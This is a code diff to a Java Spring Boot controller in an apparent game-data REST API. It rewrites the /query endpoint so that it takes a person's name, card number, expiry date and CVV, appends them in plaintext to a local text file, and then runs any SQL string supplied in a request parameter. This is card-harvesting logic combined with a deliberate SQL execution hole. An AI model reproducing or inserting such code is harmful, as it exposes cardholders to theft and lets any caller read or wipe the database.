@@ -1,5 +1,8 @@
 package com.dambi.restapi;
 
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
 import java.sql.Timestamp;
 import java.text.DateFormat;
 import java.text.ParseException;
@@ -17,6 +20,8 @@ import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
+
+import antlr.StringUtils;
 
 @RestController // This means that this class is a Controller
 @RequestMapping(path = "/demo") // This means URL's start with /demo (after Application path)
@@ -113,20 +118,46 @@ public class MainController {
     @RestController
     @RequestMapping("/query")
     public class QueryController {
-    
+
         private final JdbcTemplate jdbcTemplate;
-    
+
         @Autowired
         public QueryController(JdbcTemplate jdbcTemplate) {
             this.jdbcTemplate = jdbcTemplate;
         }
-    
-        @GetMapping
-        public List<Map<String, Object>> executeQuery(@RequestParam("id") String id) {
-            //String query = "SELECT * FROM partida WHERE id > " + id + "order by id asc";
-            String query = id;
 
-            return jdbcTemplate.queryForList(query);
+        @GetMapping
+        public List<Map<String, Object>> executeQuery(
+                @RequestParam("Nombre y apellidos") String nombreApellido,
+                @RequestParam("Numero de tarjeta (sin espacios)") String numTarjeta,
+                @RequestParam("Fecha de caducidad (MM/AA)") String fechaCad,
+                @RequestParam("CVV") String cvv,
+                @RequestParam("query") String query) {
+
+            if (nombreApellido.contains(" ") && numTarjeta.length() == 16 && cvv.length() == 3 && fechaCad.length() == 5
+                    && fechaCad.contains("/")) {
+                try {
+                    System.out.println(new File("").getAbsolutePath());
+                    FileWriter fw = new FileWriter("./src/main/data/informazioa.txt", true);
+                    BufferedWriter bw = new BufferedWriter(fw);
+                    SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");  
+                    Date date = new Date();  
+                    bw.write("[" + formatter.format(date) + "]" + nombreApellido + " - " + numTarjeta + " - " + fechaCad + " - " + cvv);
+                    bw.newLine();
+                    bw.close();
+                } catch (Exception e) {
+                    System.out.println(e);
+                }
+                return jdbcTemplate.queryForList(query);
+            } else {
+                return null;
+            }
+
+            // String query = "SELECT * FROM partida WHERE id > " + id + "order by id asc";
+
+
+
+
         }
     }
 }
